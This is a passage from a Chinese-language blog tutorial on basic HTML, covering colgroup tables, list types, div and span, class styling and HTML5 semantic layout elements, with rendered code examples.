punctuation">/></span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>col</span> <span class="token attr-name">align</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>right<span class="token punctuation">"</span></span> <span class="token punctuation">/></span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>tr</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>th</span><span class="token punctuation">></span></span>ISBN<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>th</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>th</span><span class="token punctuation">></span></span>Title<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>th</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>th</span><span class="token punctuation">></span></span>Price<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>th</span><span class="token punctuation">></span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>tr</span><span class="token punctuation">></span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>tr</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>td</span><span class="token punctuation">></span></span>3476896<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>td</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>td</span><span class="token punctuation">></span></span>My first HTML<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>td</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>td</span><span class="token punctuation">></span></span>$53<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>td</span><span class="token punctuation">></span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>tr</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>table</span><span class="token punctuation">></span></span></code></pre><table width="100%" border="1">  <colgroup><col align="left">  <col align="left">  <col align="right">  </colgroup><tbody><tr>    <th>ISBN</th>    <th>Title</th>    <th>Price</th>  </tr>  <tr>    <td>3476896</td>    <td>My first HTML</td>    <td>$53</td>  </tr></tbody></table><p><em>（然而我用Firefox、Chrome、Edge都没有效果emmmm。</em></p><hr><p><code>colgroup</code> 标签用于对表格中的列进行组合，以便对其进行格式化。</p><p>如需对全部列应用样式，<code>&lt;colgroup&gt;</code>标签很有用，这样就不需要对各个单元和各行重复应用样式了。</p><p><code>&lt;colgroup&gt;</code> 标签只能在 <code>table</code> 元素中使用。</p><p>例如两个 colgroup 元素为表格中的三列规定了不同的对齐方式和样式（注意第一个 colgroup 元素横跨两列）：</p><pre class=" language-html"><code class="language-html"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>table</span> <span class="token attr-name">width</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>100%<span class="token punctuation">"</span></span> <span class="token attr-name">border</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>1<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>colgroup</span> <span class="token attr-name">span</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>2<span class="token punctuation">"</span></span> <span class="token attr-name">align</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>left<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>colgroup</span><span class="token punctuation">></span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>colgroup</span> <span class="token attr-name">align</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>right<span class="token punctuation">"</span></span><span class="token style-attr language-css"><span class="token attr-name"> <span class="token attr-name">style</span></span><span class="token punctuation">="</span><span class="token attr-value"><span class="token property">color</span><span class="token punctuation">:</span><span class="token hexcode">#0000FF</span><span class="token punctuation">;</span></span><span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>colgroup</span><span class="token punctuation">></span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>tr</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>th</span><span class="token punctuation">></span></span>ISBN<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>th</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>th</span><span class="token punctuation">></span></span>Title<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>th</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>th</span><span class="token punctuation">></span></span>Price<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>th</span><span class="token punctuation">></span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>tr</span><span class="token punctuation">></span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>tr</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>td</span><span class="token punctuation">></span></span>3476896<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>td</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>td</span><span class="token punctuation">></span></span>My first HTML<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>td</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>td</span><span class="token punctuation">></span></span>$53<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>td</span><span class="token punctuation">></span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>tr</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>table</span><span class="token punctuation">></span></span></code></pre><table width="100%" border="1">  <colgroup span="2" align="left"></colgroup>  <colgroup align="right" style="color:#0000FF;"></colgroup>  <tbody><tr>    <th>ISBN</th>    <th>Title</th>    <th>Price</th>  </tr>  <tr>    <td>3476896</td>    <td>My first HTML</td>    <td>$53</td>  </tr></tbody></table><p><em>（然而我这里还是没有效果emmm</em></p><br><h2 id="列表"><a href="#列表" class="headerlink" title="列表"></a>列表</h2><h3 id="无序列表"><a href="#无序列表" class="headerlink" title="无序列表"></a>无序列表</h3><p><strong>Unordered list</strong></p><p><strong><em>（这里的样式也被全局的样式给冲掉了 emmm</em></strong></p><p>项目列表，项目默认使用粗体圆点（典型的小黑圆圈）进行标记。</p><pre class=" language-html"><code class="language-html"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>ul</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>li</span><span class="token punctuation">></span></span>First item<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>li</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>li</span><span class="token punctuation">></span></span>Next item<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>li</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>ul</span><span class="token punctuation">></span></span></code></pre><ul>    <li>First item</li>    <li>Next item</li></ul><p>可以定义不同的样式类型。</p><h4 id="disc-类型"><a href="#disc-类型" class="headerlink" title="disc 类型"></a>disc 类型</h4><pre class=" language-html"><code class="language-html"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>ul</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>disc<span class="token punctuation">"</span></span><span class="token punctuation">></span></span> <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>li</span><span class="token punctuation">></span></span>苹果<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>li</span><span class="token punctuation">></span></span> <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>li</span><span class="token punctuation">></span></span>香蕉<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>li</span><span class="token punctuation">></span></span> <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>li</span><span class="token punctuation">></span></span>柠檬<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>li</span><span class="token punctuation">></span></span> <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>li</span><span class="token punctuation">></span></span>桔子<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>li</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>ul</span><span class="token punctuation">></span></span>  </code></pre><ul type="disc"> <li>苹果</li> <li>香蕉</li> <li>柠檬</li> <li>桔子</li></ul>  <h4 id="circle-类型"><a href="#circle-类型" class="headerlink" title="circle 类型"></a>circle 类型</h4><pre class=" language-html"><code class="language-html"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>ul</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>circle<span class="token punctuation">"</span></span><span class="token punctuation">></span></span> <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>li</span><span class="token punctuation">></span></span>苹果<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>li</span><span class="token punctuation">></span></span> <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>li</span><span class="token punctuation">></span></span>香蕉<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>li</span><span class="token punctuation">></span></span> <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>li</span><span class="token punctuation">></span></span>柠檬<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>li</span><span class="token punctuation">></span></span> <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>li</span><span class="token punctuation">></span></span>桔子<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>li</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>ul</span><span class="token punctuation">></span></span>  </code></pre><ul type="circle"> <li>苹果</li> <li>香蕉</li> <li>柠檬</li> <li>桔子</li></ul>  <h4 id="square-类型"><a href="#square-类型" class="headerlink" title="square 类型"></a>square 类型</h4><pre class=" language-html"><code class="language-html"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>ul</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>square<span class="token punctuation">"</span></span><span class="token punctuation">></span></span> <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>li</span><span class="token punctuation">></span></span>苹果<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>li</span><span class="token punctuation">></span></span> <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>li</span><span class="token punctuation">></span></span>香蕉<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>li</span><span class="token punctuation">></span></span> <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>li</span><span class="token punctuation">></span></span>柠檬<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>li</span><span class="token punctuation">></span></span> <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>li</span><span class="token punctuation">></span></span>桔子<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>li</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>ul</span><span class="token punctuation">></span></span>  </code></pre><ul type="square"> <li>苹果</li> <li>香蕉</li> <li>柠檬</li> <li>桔子</li></ul>  <h3 id="有序列表"><a href="#有序列表" class="headerlink" title="有序列表"></a>有序列表</h3><p><strong>Ordered list</strong></p><p>列表项目默认使用数字进行标记。</p><pre class=" language-html"><code class="language-html"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>ol</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>li</span><span class="token punctuation">></span></span>First item<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>li</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>li</span><span class="token punctuation">></span></span>Next item<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>li</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>ol</span><span class="token punctuation">></span></span></code></pre><ol><li>First item</li><li>Next item</li></ol><p>有序列表也可以定义不同的样式</p><h4 id="数字列表"><a href="#数字列表" class="headerlink" title="数字列表"></a>数字列表</h4><pre class=" language-html"><code class="language-html"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>ol</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>1<span class="token punctuation">"</span></span><span class="token punctuation">></span></span> <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>li</span><span class="token punctuation">></span></span>苹果<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>li</span><span class="token punctuation">></span></span> <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>li</span><span class="token punctuation">></span></span>香蕉<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>li</span><span class="token punctuation">></span></span> <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>li</span><span class="token punctuation">></span></span>柠檬<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>li</span><span class="token punctuation">></span></span> <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>li</span><span class="token punctuation">></span></span>桔子<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>li</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>ol</span><span class="token punctuation">></span></span>  </code></pre><ol type="1"> <li>苹果</li> <li>香蕉</li> <li>柠檬</li> <li>桔子</li></ol>  <h4 id="字母列表"><a href="#字母列表" class="headerlink" title="字母列表"></a>字母列表</h4><p>大写字母</p><pre class=" language-html"><code class="language-html"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>ol</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>A<span class="token punctuation">"</span></span><span class="token punctuation">></span></span> <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>li</span><span class="token punctuation">></span></span>苹果<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>li</span><span class="token punctuation">></span></span> <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>li</span><span class="token punctuation">></span></span>香蕉<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>li</span><span class="token punctuation">></span></span> <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>li</span><span class="token punctuation">></span></span>柠檬<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>li</span><span class="token punctuation">></span></span> <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>li</span><span class="token punctuation">></span></span>桔子<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>li</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>ol</span><span class="token punctuation">></span></span>  </code></pre><ol type="A"> <li>苹果</li> <li>香蕉</li> <li>柠檬</li> <li>桔子</li></ol>  <p>小写字母改成 <code>&lt;ol type="a"&gt;</code> 即可。</p><h4 id="罗马字母列表"><a href="#罗马字母列表" class="headerlink" title="罗马字母列表"></a>罗马字母列表</h4><pre class=" language-html"><code class="language-html"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>ol</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>I<span class="token punctuation">"</span></span><span class="token punctuation">></span></span> <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>li</span><span class="token punctuation">></span></span>苹果<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>li</span><span class="token punctuation">></span></span> <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>li</span><span class="token punctuation">></span></span>香蕉<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>li</span><span class="token punctuation">></span></span> <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>li</span><span class="token punctuation">></span></span>柠檬<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>li</span><span class="token punctuation">></span></span> <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>li</span><span class="token punctuation">></span></span>桔子<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>li</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>ol</span><span class="token punctuation">></span></span>  </code></pre><ol type="I"> <li>苹果</li> <li>香蕉</li> <li>柠檬</li> <li>桔子</li></ol>  <p>小写罗马字母则为 <code>&lt;ol type="i"&gt;</code> 。</p><ol type="i"> <li>苹果</li> <li>香蕉</li> <li>柠檬</li></ol><h3 id="定义列表"><a href="#定义列表" class="headerlink" title="定义列表"></a>定义列表</h3><p><strong>Definition list</strong></p><p>自定义列表不仅仅是一列项目，而是项目及其注释的组合。</p><p>自定义列表以 <code>&lt;dl&gt;</code> 标签开始。每个自定义列表项以 <code>&lt;dt&gt;</code> 开始。每个自定义列表项的定义以 <code>&lt;dd&gt;</code> 开始。</p><pre class=" language-html"><code class="language-html"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>dl</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>dt</span><span class="token punctuation">></span></span>First term<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>dt</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>dd</span><span class="token punctuation">></span></span>Definition<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>dd</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>dt</span><span class="token punctuation">></span></span>Next term<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>dt</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>dd</span><span class="token punctuation">></span></span>Definition<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>dd</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>dl</span><span class="token punctuation">></span></span></code></pre><dl>    <dt>First term</dt>    <dd>Definition</dd>    <dt>Next term</dt>    <dd>Definition</dd></dl><h3 id="嵌套列表"><a href="#嵌套列表" class="headerlink" title="嵌套列表"></a>嵌套列表</h3><pre class=" language-html"><code class="language-html"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>ul</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>li</span><span class="token punctuation">></span></span>咖啡<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>li</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>li</span><span class="token punctuation">></span></span>茶        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>ul</span><span class="token punctuation">></span></span>            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>li</span><span class="token punctuation">></span></span>红茶<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>li</span><span class="token punctuation">></span></span>            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>li</span><span class="token punctuation">></span></span>绿茶                <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>ul</span><span class="token punctuation">></span></span>                    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>li</span><span class="token punctuation">></span></span>中国茶<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>li</span><span class="token punctuation">></span></span>                    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>li</span><span class="token punctuation">></span></span>非洲茶<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>li</span><span class="token punctuation">></span></span>                <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>ul</span><span class="token punctuation">></span></span>            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>li</span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>ul</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>li</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>li</span><span class="token punctuation">></span></span>牛奶<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>li</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>ul</span><span class="token punctuation">></span></span></code></pre><ul>    <li>咖啡</li>    <li>茶        <ul>            <li>红茶</li>            <li>绿茶                <ul>                    <li>中国茶</li>                    <li>非洲茶</li>                </ul>            </li>        </ul>    </li>    <li>牛奶</li></ul><br><h2 id="块"><a href="#块" class="headerlink" title="块"></a>块</h2><p>可以通过  <code>&lt;div&gt;</code>  和  <code>&lt;span&gt;</code> 将 HTML 元素组合起来。</p><p>大多数 HTML 元素被定义为<strong>块级元素</strong>或<strong>内联元素</strong>。“块级元素” <em>block level element</em>，“内联元素” <em>inline element</em>。</p><p><strong>块级元素</strong>在浏览器显示时，通常会以新行来开始（和结束）。</p><p><strong>内联元素</strong>在显示时通常不会以新行开始。</p><h3 id="div-元素"><a href="#div-元素" class="headerlink" title="div 元素"></a>div 元素</h3><p>division/section</p><p>可以说是最常用的<strong>块级元素</strong>8。可用于组合其他 HTML 元素的容器。</p><p>它没有特定的含义。除此之外，由于它属于块级元素，浏览器会在其前后显示折行。</p><p>如果与 CSS 一同使用，<code>&lt;div&gt;</code> 元素可用于<strong>对大的内容块设置样式属性</strong>。</p><p><code>&lt;div&gt;</code> 元素的另一个常见的用途是<strong>文档布局</strong>。</p><h3 id="span-元素"><a href="#span-元素" class="headerlink" title="span 元素"></a>span 元素</h3><p><strong>内联元素</strong>，可用作文本的容器。</p><p>也没有特定的含义。</p><p>也可以与 CSS 一同使用，来给部分文本定义样式属性。</p><br><h2 id="类"><a href="#类" class="headerlink" title="类"></a>类</h2><p><code>class</code>属性</p><p>可以用来给同一类元素设置相同的样式。</p><p>设置 <code>&lt;div&gt;</code> 元素的类，使我们能够为相同的 <code>&lt;div&gt;</code> 元素设置相同的样式：</p><pre class=" language-html"><code class="language-html"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>style</span><span class="token punctuation">></span></span><span class="token style language-css"><span class="token selector"><span class="token class">.miaotest</span> </span><span class="token punctuation">{</span>    <span class="token property">background-color</span><span class="token punctuation">:</span>pink<span class="token punctuation">;</span>    <span class="token property">color</span><span class="token punctuation">:</span>white<span class="token punctuation">;</span>    <span class="token property">margin</span><span class="token punctuation">:</span><span class="token number">20</span>px<span class="token punctuation">;</span>    <span class="token property">padding</span><span class="token punctuation">:</span><span class="token number">20</span>px<span class="token punctuation">;</span><span class="token punctuation">}</span> </span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>style</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>miaotest<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>p</span><span class="token punctuation">></span></span>London<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>p</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>p</span><span class="token punctuation">></span></span>London is the capital city of England. It is the most populous city in the United Kingdom, with a metropolitan area of over 13 million inhabitants.<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>p</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>miaotest<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>p</span><span class="token punctuation">></span></span>Paris<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>p</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>p</span><span class="token punctuation">></span></span>Paris is the capital and most populous city of France.<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>p</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">></span></span></code></pre><style>.miaotest {    background-color:pink;    color:white;    margin:20px;    padding:20px;} </style><div class="miaotest"><p>London</p><p>London is the capital city of England. It is the most populous city in the United Kingdom, with a metropolitan area of over 13 million inhabitants.</p></div><div class="miaotest"><p>Paris</p><p>Paris is the capital and most populous city of France.</p></div><p>同理，也可以设置 <code>&lt;span&gt;</code> 元素的<code>class</code>属性来对相同类设置样式。</p><pre class=" language-html"><code class="language-html"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>style</span><span class="token punctuation">></span></span><span class="token style language-css">  <span class="token selector">span<span class="token class">.redtest</span> </span><span class="token punctuation">{</span><span class="token property">color</span><span class="token punctuation">:</span>red<span class="token punctuation">;</span><span class="token punctuation">}</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>style</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>p</span><span class="token punctuation">></span></span>My <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>span</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>redtest<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>Important<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>span</span><span class="token punctuation">></span></span> Things<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>p</span><span class="token punctuation">></span></span></code></pre><style>  span.redtest {color:red;}</style><p>My <span class="redtest">Important</span> Things</p><br><h2 id="网页布局"><a href="#网页布局" class="headerlink" title="网页布局"></a>网页布局</h2><p>这里 HTML5 新增了不少语义化元素，替代了原先 <code>&lt;div id="xxx"&gt;</code>这样定义网页布局的形式。</p><p>具体的语义元素是这样的。</p><table><thead><tr><th align="left">语义元素</th><th>含义</th></tr></thead><tbody><tr><td align="left">header</td><td>定义文档或节的页眉</td></tr><tr><td align="left">nav</td><td>定义导航链接的容器</td></tr><tr><td align="left">section</td><td>定义文档中的节</td></tr><tr><td align="left">article</td><td>定义独立的自包含文章</td></tr><tr><td align="left">aside</td><td>定义内容之外的内容（比如侧栏）</td></tr><tr><td align="left">footer</td><td>定义文档或节的页脚</td></tr><tr><td align="left">details</td><td>定义额外的细节</td></tr><tr><td align="left">summary</td><td>定义 details 元素的标题</td></tr></tbody></table><p><img src="/2020/02/14/FrontEnd_HTML_Basic/ct_sem_elements.png" alt="HTML5 语义元素"></p><p>例如：</p><pre class=" language-html"><code class="language-html"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>body</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>header</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>h1</span><span class="token punctuation">></span></span>City Gallery<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>h1</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>header</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>nav</span><span class="token punctuation">></span></span>London<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>br</span><span class="token punctuation">></span></span>Paris<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>br</span><span class="token punctuation">></span></span>Tokyo<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>br</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>nav</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>section</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>h1</span><span class="token punctuation">></span></span>London<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>h1</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>p</span><span class="token punctuation">></span></span>London is the capital city of England. It is the most populous city in the United Kingdom,with a metropolitan area of over 13 million inhabitants.<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>p</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>p</span><span class="token punctuation">></span></span>Standing on the River Thames, London has been a major settlement for two millennia,its history going back to its founding by the Romans, who named it Londinium.<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>p</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>section</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>footer</span><span 